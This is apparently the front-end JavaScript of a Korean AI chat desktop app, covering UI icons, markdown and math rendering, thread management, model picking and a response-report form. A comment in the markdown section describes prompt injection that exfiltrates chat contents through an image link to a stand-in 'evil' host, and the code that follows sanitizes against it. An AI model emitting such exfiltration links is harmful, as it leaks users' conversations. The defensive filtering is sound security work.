// SPDX-FileCopyrightText: 2026 Beomjoon Kim
// SPDX-License-Identifier: AGPL-3.0-only
"use strict";

/* ---------- 아이콘 ---------- */
const ICONS = {
  sidebar: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="3"/><path d="M9 4v16"/></svg>',
  edit: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/></svg>',
  folder: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2Z"/></svg>',
  puzzle: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10 3h4v3a2 2 0 1 0 4 0V3h3v7h-3a2 2 0 1 0 0 4h3v7h-7v-3a2 2 0 1 0-4 0v3H3v-7h3a2 2 0 1 0 0-4H3V3h7Z"/></svg>',
  brain: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 4a3 3 0 0 0-3 3 3 3 0 0 0-2 5 3 3 0 0 0 2 5 3 3 0 0 0 3 3 3 3 0 0 0 3-3V7a3 3 0 0 0-3-3Z"/><path d="M15 4a3 3 0 0 1 3 3 3 3 0 0 1 2 5 3 3 0 0 1-2 5 3 3 0 0 1-3 3 3 3 0 0 1-3-3"/></svg>',
  gear: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1Z"/></svg>',
  up: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5"/><path d="m5 12 7-7 7 7"/></svg>',
  stop: '<svg viewBox="0 0 24 24" fill="currentColor"><rect x="7" y="7" width="10" height="10" rx="2"/></svg>',
  copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1"/></svg>',
  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>',
  flag: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 21V4"/><path d="M5 4h11l-2 4 2 4H5"/></svg>',
  trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M6 6l1 14h10l1-14"/></svg>',
  pencil: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/></svg>',
  chev: '<svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>',
  close: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M6 6l12 12M18 6 6 18"/></svg>',
  plug: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 2v5"/><path d="M15 2v5"/><path d="M6 7h12v4a6 6 0 0 1-12 0Z"/><path d="M12 17v5"/></svg>',
  plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>',
  clip: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m21 11-8.6 8.6a5.5 5.5 0 0 1-7.8-7.8l8.6-8.6a3.7 3.7 0 0 1 5.2 5.2l-8.6 8.6a1.8 1.8 0 0 1-2.6-2.6L15 6.6"/></svg>',
  file: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8Z"/><path d="M14 3v5h5"/></svg>',
  user: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg>',
  mic: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5 11a7 7 0 0 0 14 0"/><path d="M12 18v3"/></svg>',
  spark: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v4M12 17v4M3 12h4M17 12h4"/><path d="m6.3 6.3 2.1 2.1M15.6 15.6l2.1 2.1M6.3 17.7l2.1-2.1M15.6 8.4l2.1-2.1"/></svg>',
  book: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5a2 2 0 0 1 2-2h13v16H6a2 2 0 0 0-2 2Z"/><path d="M4 21V5"/><path d="M8 7h7"/></svg>',
  terminal: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3"/><path d="M13 15h4"/></svg>',
  blocks: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><path d="M17.5 14v7M14 17.5h7"/></svg>',
  paper: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8Z"/><path d="M14 3v5h5"/><path d="M9 13h6"/><path d="M9 17h4"/></svg>',
  minus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14"/></svg>',
  globe: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg>',
  forward: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>',
  external: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 4h6v6M20 4l-9 9"/><path d="M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/></svg>',
  back: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>',
  up_thumb: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v11H4V10Z"/><path d="M7 10l4-7a2 2 0 0 1 3 2l-1 5h6a2 2 0 0 1 2 2.3l-1.4 7A2 2 0 0 1 17.6 21H7"/></svg>',
  down_thumb: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M17 14V3h3v11Z"/><path d="M17 14l-4 7a2 2 0 0 1-3-2l1-5H5a2 2 0 0 1-2-2.3l1.4-7A2 2 0 0 1 6.4 3H17"/></svg>',
  flask: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3h6"/><path d="M10 3v6l-5.5 9.5A1.7 1.7 0 0 0 6 21h12a1.7 1.7 0 0 0 1.5-2.5L14 9V3"/><path d="M7.5 15h9"/></svg>',
  code: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m8 7-5 5 5 5"/><path d="m16 7 5 5-5 5"/><path d="m14 4-4 16"/></svg>',
  retry: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><path d="M3 3v5h5"/></svg>',
};

const REPO_URL = "https://github.com/pidstech/POSCHAT";

/* ---------- 상태 ---------- */
const S = {
  threads: [],
  currentId: null,
  chatViewVersion: 0,
  thread: null,
  busy: false,
  busyThread: null,
  runningThreads: new Set(),
  chatStreams: new Map(),
  chatStatus: new Map(),
  confirmQueue: [],
  confirmActive: null,
  status: "",
  workspace: { path: "", name: "", has_init: false },
  skills: [],
  config: {},
  dataDir: "",
  version: "",
  memory: [],
  slash: { items: [], index: 0 },
  attach: [],  // 입력창에 고른 첨부 파일 { id, name, size, kind, status: "uploading"|"ready"|"error", progress, url }
  attachLimits: { max_bytes: 20 * 1024 * 1024, max_files: 10 },
};

const $ = (sel, root = document) => root.querySelector(sel);
const api = () => window.pywebview.api;

function h(tag, attrs = {}, ...children) {
  const node = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (v == null || v === false) continue;
    if (k === "class") node.className = v;
    else if (k === "html") node.innerHTML = v;
    else if (k.startsWith("on")) node.addEventListener(k.slice(2), v);
    else node.setAttribute(k, v === true ? "" : v);
  }
  for (const c of children.flat()) {
    if (c == null || c === false) continue;
    node.append(c instanceof Node ? c : document.createTextNode(String(c)));
  }
  return node;
}

/* 1.19 다녀온 링크: 링크는 앱 밖 기본 브라우저로 열려 :visited가 생기지 않으므로, 누른 주소를 이 기기에 기억해 표시한다 */
const VISITED_KEY = "poschat.visitedLinks";
const VISITED = (() => {
  try { return new Set(JSON.parse(localStorage.getItem(VISITED_KEY) || "[]")); } catch { return new Set(); }
})();
function markVisited(root) {
  if (!VISITED.size || !root.querySelectorAll) return;
  const links = root.matches?.("a[href]") ? [root] : root.querySelectorAll("a[href]");
  for (const a of links) if (VISITED.has(a.href)) a.setAttribute("data-visited", "");
}
function rememberVisited(e) {
  const a = e.target.closest?.("a[href]");
  if (!a || !/^https?:/i.test(a.href)) return;
  VISITED.delete(a.href);
  VISITED.add(a.href);
  while (VISITED.size > 1000) VISITED.delete(VISITED.values().next().value);
  try { localStorage.setItem(VISITED_KEY, JSON.stringify([...VISITED])); } catch { /* 저장소가 가득 참 */ }
  document.querySelectorAll("a[href]").forEach((x) => { if (x.href === a.href) x.setAttribute("data-visited", ""); });
}
document.addEventListener("click", rememberVisited, true);
document.addEventListener("auxclick", rememberVisited, true);
new MutationObserver((records) => {
  for (const r of records) for (const n of r.addedNodes) if (n.nodeType === 1) markVisited(n);
}).observe(document.documentElement, { childList: true, subtree: true });

/* 데이터(플러그인 정보·서버 응답)에서 온 주소를 링크로 쓸 때: 절대 http(s) 주소만, 아니면 null(h()가 href를 빼 준다). */
function safeHref(url) {
  const text = String(url || "").trim();
  return /^https?:\/\/[^\s/]/i.test(text) ? text : null;
}

function toast(text) {
  const t = $("#toast");
  t.textContent = text;
  t.hidden = false;
  clearTimeout(toast._timer);
  toast._timer = setTimeout(() => (t.hidden = true), 2200);
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const ta = h("textarea", { style: "position:fixed;opacity:0" });
    ta.value = text;
    document.body.append(ta);
    ta.select();
    document.execCommand("copy");
    ta.remove();
  }
  toast("복사했습니다");
}

/* ---------- 마크다운 ---------- */
// 아주 오래된 WebView(안드로이드)에서는 marked를 불러오지 못할 수 있다. 그때는 서식 없이 글자만 보여 준다.
if (window.marked) marked.setOptions({ gfm: true, breaks: true });

// 수식: \( \)와 $ $는 문장 안 수식, \[ \]와 $$ $$는 독립 수식으로 KaTeX가 그린다.
// marked 확장으로 처리하므로 코드 블록과 `인라인 코드` 안은 수식으로 바뀌지 않는다.
// $ 한 개는 금액("$5와 $10")과 헷갈리지 않도록 $ 바로 안쪽에 공백이 없고 닫는 $ 뒤에 숫자가 없을 때만 수식으로 본다.
const MATH_INLINE = [
  [/^\$\$([\s\S]+?)\$\$/, true],
  [/^\\\[([\s\S]+?)\\\]/, true],
  [/^\\\(([\s\S]+?)\\\)/, false],
  [/^\$(?![\s$])((?:\\[\s\S]|[^\\$\n])+?)(?<!\s)\$(?!\d)/, false],
];
const MATH_BLOCK = /^ {0,3}(?:\$\$([\s\S]+?)\$\$|\\\[([\s\S]+?)\\\])[ \t]*(?:\n+|$)/;

function renderMath(tex, displayMode) {
  // throwOnError: false — 문법이 틀린 수식은 오류 대신 원문을 빨간색으로 보여 준다.
  return katex.renderToString(tex.trim(), { displayMode, throwOnError: false, output: "html", strict: "ignore" });
}

if (window.katex && window.marked) {
  marked.use({
    extensions: [
      {
        name: "mathBlock",
        level: "block",
        start: (src) => src.match(/^ {0,3}(?:\$\$|\\\[)/m)?.index,
        tokenizer(src) {
          const m = MATH_BLOCK.exec(src);
          if (m) return { type: "mathBlock", raw: m[0], text: m[1] ?? m[2] };
        },
        renderer: (token) => renderMath(token.text, true) + "\n",
      },
      {
        name: "mathInline",
        level: "inline",
        start: (src) => {
          const i = src.search(/\$|\\[([]/);
          return i < 0 ? undefined : i;
        },
        tokenizer(src) {
          for (const [re, display] of MATH_INLINE) {
            const m = re.exec(src);
            if (m) return { type: "mathInline", raw: m[0], text: m[1], display };
          }
        },
        renderer: (token) => renderMath(token.text, token.display),
      },
    ],
  });
}

// CommonMark는 "**`코드`**로"처럼 닫는 ** 바로 뒤에 한글이 오면 굵게로 인식하지 않는다.
// 코드 블록 밖의 **...**를 미리 <strong>으로 바꿔 둔다(안쪽 마크다운은 그대로 처리된다).
function fixKoreanBold(text) {
  return text.split(/(```[\s\S]*?```)/).map((part, i) =>
    i % 2 ? part : part.replace(/\*\*(?=\S)([^*\n]*?\S)\*\*/g, "<strong>$1</strong>")).join("");
}

/* 모델 출력·문서·MCP 결과에 심은 지시(프롬프트 인젝션)가 화면을 통해 자료를 밖으로 보내지 못하게 한다.
   - 이미지는 data:image·blob:만 그린다. ![](https://evil/?d=대화내용)은 그리는 순간 요청이 나가므로 주소를 지운다.
   - 링크는 절대 https?:·mailto:만 남긴다. //host/x는 file:// 화면 기준으로 UNC(SMB) 경로가 되므로 지운다.
   - 그 밖의 주소 속성(srcset·poster·background·action 등)과 url(...)이 든 style도 지운다.
   KaTeX가 만든 style(높이·여백)과 내부 svg는 그대로 둔다. */
const MD_PURIFY = {
  FORBID_TAGS: ["style", "link", "meta", "base", "form", "input", "button", "textarea", "select",
    "video", "audio", "source", "track", "picture", "object", "embed", "iframe", "frame", "image", "use", "foreignObject"],
  FORBID_ATTR: ["srcset", "poster", "background", "action", "formaction", "ping", "lowsrc", "dynsrc", "data"],
};
const MD_LINK_OK = /^(https?:\/\/|mailto:)/i;
const MD_IMG_OK = /^(data:image\/(png|jpe?g|gif|webp);|blob:)/i;
// CSS 이스케이프(\75 rl( = url()·주석·@규칙으로 검사를 피하지 못하게 백슬래시·/*·@가 든 style은 통째로 지운다
const MD_STYLE_BAD = /url\s*\(|image-set|image\s*\(|@|expression\s*\(|\\|\/\*/i;
// SVG 속성(fill·mask·clip-path·filter·marker-*)의 url(...)도 외부 주소를 부른다. 문서 안 참조(url(#id))만 남긴다
const MD_ATTR_URL = /url\s*\(\s*(?!['"]?#)/i;
if (window.DOMPurify) {
  DOMPurify.addHook("afterSanitizeAttributes", (node) => {
    if (!renderMarkdown.active) return;
    if (node.hasAttribute("href") || node.hasAttribute("xlink:href")) {
      const href = (node.getAttribute("href") || node.getAttribute("xlink:href") || "").trim();
      const isLink = node.tagName === "A";
      if (!(isLink ? MD_LINK_OK.test(href) : href.startsWith("#"))) {
        node.removeAttribute("href");
        node.removeAttribute("xlink:href");
      }
    }
    if (node.hasAttribute("src")) {
      const src = (node.getAttribute("src") || "").trim();
      if (!(node.tagName === "IMG" && MD_IMG_OK.test(src))) {
        node.removeAttribute("src");
        node.setAttribute("data-blocked-src", src.slice(0, 300));
      }
    }
    if (node.hasAttribute("style") && MD_STYLE_BAD.test(node.getAttribute("style"))) node.removeAttribute("style");
    for (const attr of Array.from(node.attributes || [])) {
      if (attr.name !== "style" && (MD_ATTR_URL.test(attr.value) || attr.value.includes("\\"))) node.removeAttribute(attr.name);
    }
  });
}

function renderMarkdown(text) {
  const box = h("div", { class: "md" });
  if (!window.marked || !window.DOMPurify) {
    box.style.whiteSpace = "pre-wrap";
    box.textContent = text || "";
    return box;
  }
  renderMarkdown.active = true;
  try {
    box.innerHTML = DOMPurify.sanitize(marked.parse(fixKoreanBold(text || "")), MD_PURIFY);
  } finally {
    renderMarkdown.active = false;
  }
  // 막힌 외부 이미지는 그리지 않고 대체 글과 주소를 글자로만 보여 준다(누르거나 불러오지 않는다)
  box.querySelectorAll("img[data-blocked-src]").forEach((img) => {
    const src = img.getAttribute("data-blocked-src");
    const alt = img.getAttribute("alt") || "이미지";
    img.replaceWith(h("span", { class: "md-blocked-img", title: "외부 이미지는 불러오지 않습니다" },
      `[${alt}]`, src ? ` (${src})` : ""));
  });
  box.querySelectorAll("a").forEach((a) => {
    if (a.hasAttribute("href")) {
      a.setAttribute("target", "_blank");
      a.setAttribute("rel", "noopener noreferrer");
    }
  });
  box.querySelectorAll("pre").forEach((pre) => {
    const code = pre.querySelector("code");
    const lang = ((code && code.className.match(/language-(\S+)/)) || [])[1] || "code";
    const btn = h("button", { html: ICONS.copy + "<span>복사</span>" });
    btn.addEventListener("click", () => copyText(code ? code.textContent : pre.textContent));
    pre.prepend(h("div", { class: "code-head" }, h("span", {}, lang), btn));
  });
  return box;
}

/* ---------- 사이드바 ---------- */
function groupLabel(ts) {
  const d = new Date(ts * 1000);
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const diff = (today - new Date(d.getFullYear(), d.getMonth(), d.getDate())) / 86400000;
  if (diff <= 0) return "오늘";
  if (diff === 1) return "어제";
  if (diff < 7) return "지난 7일";
  if (diff < 30) return "지난 30일";
  return `${d.getFullYear()}년 ${d.getMonth() + 1}월`;
}

function renderSidebar() {
  const list = $("#thread-list");
  const keep = list.scrollTop;  // 목록을 다시 그려도 보던 자리를 지킨다
  list.innerHTML = "";
  let last = null;
  for (const t of S.threads) {
    const g = groupLabel(t.updated);
    if (g !== last) {
      list.append(h("div", { class: "group-title" }, g));
      last = g;
    }
    const item = h("div", { class: "thread" + (t.id === S.currentId ? " active" : ""), title: t.title },
      h("span", { class: "t-title" }, t.title),
      S.runningThreads.has(t.id) ? h("span", { class: "spinner-dot" }) : null,
      h("span", { class: "t-actions" },
        h("button", { title: "이름 변경", html: ICONS.pencil, onclick: (e) => { e.stopPropagation(); startRename(item, t); } }),
        h("button", { title: "삭제", html: ICONS.trash, onclick: (e) => { e.stopPropagation(); deleteThread(t); } }),
      ),
    );
    item.addEventListener("click", () => openThread(t.id));
    item.addEventListener("dblclick", () => startRename(item, t));
    list.append(item);
  }
  list.scrollTop = keep;
  const ws = S.workspace;
  $("#ws-name").textContent = ws.path ? ws.name + (ws.has_init ? " · INIT.md" : "") : "선택 안 됨";
  $("#btn-workspace").title = ws.path || "작업 폴더를 선택하세요";
}

function startRename(item, t) {
  const input = h("input", { value: t.title });
  const done = async (save) => {
    if (save && input.value.trim() && input.value.trim() !== t.title) {
      S.threads = await api().rename_thread(t.id, input.value.trim());
      if (t.id === S.currentId) {
        S.thread.title = input.value.trim();
        $("#chat-title").textContent = S.thread.title;
      }
    }
    renderSidebar();
  };
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.isComposing) done(true);
    if (e.key === "Escape") done(false);
  });
  input.addEventListener("blur", () => done(true));
  input.addEventListener("click", (e) => e.stopPropagation());
  item.replaceChildren(input);
  input.focus();
  input.select();
}

async function deleteThread(t) {
  if (!confirm(`'${t.title}' 대화를 삭제할까요?`)) return;
  S.threads = await api().delete_thread(t.id);
  if (t.id === S.currentId) {
    if (S.threads.length) await openThread(S.threads[0].id);
    else await newThread();
  } else renderSidebar();
}

async function refreshThreads() {
  S.threads = await api().list_threads();
  renderSidebar();
}

/* ---------- 대화 ---------- */
// leave=false: 앱을 시작할 때처럼 사용자가 고른 것이 아니면 열어 둔 화면(코드·Lab 등)을 닫지 않는다
async function openThread(id, leave = true) {
  const version = ++S.chatViewVersion;
  if (leave) leaveViews();
  const thread = await api().load_thread(id);
  if (version !== S.chatViewVersion) return;
  if (!thread) return refreshThreads();
  S.currentId = id;
  S.thread = thread;
  S.busy = S.runningThreads.has(id);
  S.busyThread = S.busy ? id : null;
  S.status = S.chatStatus.get(id) || "생각하는 중...";
  endStreaming();
  updateSend();
  // 다른 화면이 열려 있으면(leave=false) 대화는 뒤에서 준비만 하고, 제목·대화 선택 표시·초점은 그 화면을 닫을 때 돌아온다
  const inView = !leave && ((typeof PAGE !== "undefined" && PAGE.id) || (typeof PO !== "undefined" && PO.open)
    || (typeof CODE !== "undefined" && CODE.open));
  if (!inView) $("#chat-title").textContent = thread.title;
  renderThreadModel();
  renderSidebar();
  if (inView) document.querySelectorAll(".thread.active").forEach((t) => t.classList.remove("active"));
  renderMessages();
  if (S.chatStreams.has(id)) showStreaming(S.chatStreams.get(id));
  if (inView) return;
  if (isNarrow()) setCollapsed(true);
  else $("#input").focus();  // 휴대폰에서는 키보드가 화면을 가리지 않게 자동으로 띄우지 않는다
}

// 지금 API 방식에서 고를 수 있는 모델과 새 대화의 기본 모델(PO노트 노트 만들기도 같은 목록을 쓴다)
function modeModels() {
  const mode = S.config.api_mode || "chat_completions";
  const base = mode === "responses" ? (S.responsesModels || [])
    : mode === "anthropic" ? (S.anthropicModels || []) : mode === "openai" ? (S.openaiModels || []) : (S.models || []);
  // 1.17: 자동 선택을 켰으면 '자동'과 로컬 모델을 앞에 더한다(adaptive.js)
  return window.adaptiveModelOptions ? adaptiveModelOptions(base) : base;
}

function modeDefaultModel() {
  const models = modeModels();
  const configured = S.config.api_mode === "anthropic" ? S.config.anthropic_model
    : S.config.api_mode === "openai" ? S.config.openai_model : S.config.model;
  return models.some((m) => m.id === configured) ? configured : ((models[0] || {}).id || "");
}

function renderThreadModel() {
  const select = $("#thread-model");
  const picker = $("#thread-model-picker");
  if (!select || !picker) return;
  const mode = S.config.api_mode || "chat_completions";
  picker.hidden = !S.thread || mode === "a1";
  if (picker.hidden) return;
  const models = modeModels();
  select.replaceChildren(...models.map((m) => h("option", { value: m.id }, m.label)));
  // 대화에 저장된 모델이 지금 API 방식에 없으면(방식을 바꾼 경우) 그 방식의 기본 모델을 보인다(보낼 때도 같다)
  const selected = S.thread.model;
  select.value = models.some((m) => m.id === selected) ? selected : modeDefaultModel();
  select.disabled = S.busy;
}

// PO노트·도구·코드 화면에서 채팅으로 돌아온다(코드의 열린 탭·저장하지 않은 내용은 그대로 남는다)
function leaveViews() {
  if (window.codeLeave) codeLeave();
  if (window.poLeave) poLeave();
  if (window.pageLeave) pageLeave();
}

async function newThread(leave = true) {
  // 이미 비어 있는 새 대화가 열려 있으면 그대로 쓴다
  if (S.thread && !S.thread.messages.length) {
    if (leave) leaveViews();
    $("#input").focus();
    return;
  }
  const thread = await api().new_thread();
  S.threads.unshift({ id: thread.id, title: thread.title, updated: thread.updated });
  await openThread(thread.id, leave);
}

/* 부적절한 AI 응답 신고(1.18, Microsoft Store 정책 11.16 '생성형 AI 콘텐츠'): GitHub 이슈 양식(.github/ISSUE_TEMPLATE/ai-report.yml)을
   채워서 브라우저로 연다. 이슈는 공개이므로 답변을 넣을지는 사용자가 고르고, 넣을 글을 보고 고칠 수 있다. 앱이 몰래 보내는 것은 없다. */
const REPORT_REASONS = ["유해하거나 위험한 내용", "혐오·차별·괴롭힘", "성적인 내용", "개인정보 노출", "사실과 다른 내용(환각)", "그 밖의 문제"];
const REPORT_MAX = 1500;  // 주소 길이 제한 때문에 답변은 앞부분만

function reportUrl({ reason, note, response, model }) {
  const q = new URLSearchParams({ template: "ai-report.yml", title: `[AI 응답 신고] ${reason}`, reason,
    what: note || "", response: response || "", model: model || "", version: `${S.version || ""}${S.distribution === "store" ? " (Microsoft Store)" : ""}` });
  return `${REPO_URL}/issues/new?${q.toString()}`;
}

function reportAiResponse({ content, model }) {
  const text = String(content || "");
  const reason = h("select", { id: "report-reason", "aria-label": "신고 이유" }, ...REPORT_REASONS.map((r) => h("option", { value: r }, r)));
  const note = h("textarea", { id: "report-note", rows: 3, placeholder: "무엇이 문제인지 짧게 적어 주세요(선택)" });
  const include = h("input", { type: "checkbox", id: "report-include" });
  const preview = h("textarea", { id: "report-response", rows: 6, hidden: true, "aria-label": "이슈에 넣을 답변" },
    text.length > REPORT_MAX ? text.slice(0, REPORT_MAX) + " …(잘림)" : text);
  include.addEventListener("change", () => { preview.hidden = !include.checked; });
  modal({
    title: "부적절한 응답 신고",
    body: h("div", { class: "report-form" },
      h("p", { style: "margin:0 0 10px;color:var(--text-2)" }, "AI가 만든 답변에 문제가 있으면 알려 주세요. 신고는 GitHub 이슈로 받고, 확인해 고칩니다. ",
        h("b", {}, "GitHub 이슈는 누구나 볼 수 있습니다"), " — 개인정보·비밀이 든 내용은 넣지 마세요(GitHub 계정이 필요합니다)."),
      h("label", { class: "field" }, h("span", {}, "이유"), reason),
      h("label", { class: "field" }, h("span", {}, "설명"), note),
      h("label", { style: "display:flex;gap:6px;align-items:center;margin:6px 0" }, include, "답변 내용을 함께 넣기(아래에서 고칠 수 있음)"),
      preview),
    buttons: [{ label: "취소", value: null }, { label: "GitHub에서 신고 열기", class: "primary", action: (close) => {
      const url = reportUrl({ reason: reason.value, note: note.value.trim(), response: include.checked ? preview.value : "", model });
      const a = h("a", { href: url, target: "_blank", rel: "noopener", hidden: true, id: "report-link" });
      document.body.append(a);
      a.click();
      setTimeout(() => a.remove(), 1000);
      close();
      toast("브라우저에서 신고 양식을 열었습니다. 내용을 확인하고 'Create'를 누르세요");
    } }],
  });
}
window.reportAiResponse = reportAiResponse;
window.reportUrl = reportUrl;

// 답변 평가(👍/👎): 대화에 저장하고 사용량·진단 탭의 모델별 비교에 쓴다
function feedbackButton(msg, rating) {
  const btn = h("button", { title: rating > 0 ? "좋은 답변" : "아쉬운 답변", class: msg.feedback === rating ? "active" : "",
    html: rating > 0 ? ICONS.up_thumb : ICONS.down_thumb });
  btn.addEventListener("click", async () => {
    if (!S.currentId) return;
    const next = msg.feedback === rating ? 0 : rating;
    const res = await api().feedback(S.currentId, msg.id, next);
    if (res.ok === false) return toast(res.error);
    msg.feedback = next || undefined;
    btn.parentElement.querySelectorAll("button.active").forEach((b) => b.classList.remove("active"));
    if (next) btn.classList.add("active");
    toast(next ? "평가를 남겼습니다" : "평가를 지웠습니다");
  });
  return btn;
}

function messageNode(msg) {
  if (msg.role === "user") {
    const files = msg.attachments && msg.attachments.length ? attachmentList(msg.attachments) : null;
    return h("div", { class: "msg user" + (files ? " has-files" : "") },
      files,
      msg.content ? h("div", { class: "bubble" }, msg.content) : null);
  }
  if (msg.role === "assistant") {
    // 1.17: 자동·로컬 모델로 답했으면 고른 모델과 이유(펼치기)
    const route = msg.routing && window.routeBadge && (S.config.adaptive || {}).show_badge !== false ? routeBadge(msg.routing) : null;
    return h("div", { class: "msg assistant" },
      h("div", { class: "avatar" }, "P"),
      h("div", { class: "body" },
        renderMarkdown(msg.content),
        route,
        h("div", { class: "msg-actions" },
          h("button", { title: "복사", html: ICONS.copy, onclick: () => copyText(msg.content) }),
